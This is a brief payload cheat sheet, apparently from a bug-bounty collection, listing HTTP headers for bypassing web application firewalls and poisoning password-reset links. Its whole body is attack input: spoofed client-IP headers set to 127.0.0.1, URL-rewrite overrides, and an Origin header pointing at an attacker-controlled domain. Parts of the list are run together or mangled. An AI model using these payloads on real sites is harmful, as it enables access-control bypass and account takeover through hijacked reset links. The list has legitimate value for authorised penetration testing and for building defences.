# WAF Bypass using Headers(Password reset poisoning)
  For waf bypass, and similar
  ```
	X-Forwarded-Host
	X-Forwarded-Port
	X-Forwarded-Scheme
	Origin: 
	nullOrigin: [siteDomain].attacker.com
	X-Frame-Options: Allow
	X-Forwarded-For: 127.0.0.1
	X-Client-IP: 127.0.0.1
	Client-IP: 127.0.0.1
        Proxy-Host: 127.0.0.1                                 Request-Uri: 127.0.0.1
 X-Forwarded: 127.0.0.1                               X-Forwarded-By: 127.0.0.1
 X-Forwarded-For: 127.0.0.1                           X-Forwarded-For-Original: 127.0.0.1
 X-Forwarded-Host: 127.0.0.1                          X-Forwarded-Server: 127.0.0.1
 X-Forwarder-For: 127.0.0.1
 X-Forward-For: 127.0.0.1
 Base-Url: 127.0.0.1                                  Http-Url: 127.0.0.1
 Proxy-Url: 127.0.0.1
 Redirect: 127.0.0.1
 Real-Ip: 127.0.0.1
 Referer: 127.0.0.1
 Referer: 127.0.0.1
 Referrer: 127.0.0.1
 Refferer: 127.0.0.1
 Uri: 127.0.0.1
 Url: 127.0.0.1
 X-Host: 127.0.0.1
 X-Http-Destinationurl: 127.0.0.1                     X-Http-Host-Override: 127.0.0.1
 X-Original-Remote-Addr: 127.0.0.1
 X-Original-Url: 127.0.0.1
 X-Proxy-Url: 127.0.0.1
 X-Rewrite-Url: 127.0.0.1
 X-Real-Ip: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
 X-Custom-IP-Authorization:127.0.0.1
 X-Originating-IP: 127.0.0.1
 X-Remote-IP: 127.0.0.1
  ```
  
 # Authors
* [Virdoex_hunter](https://twitter.com/Virdoex_hunter)
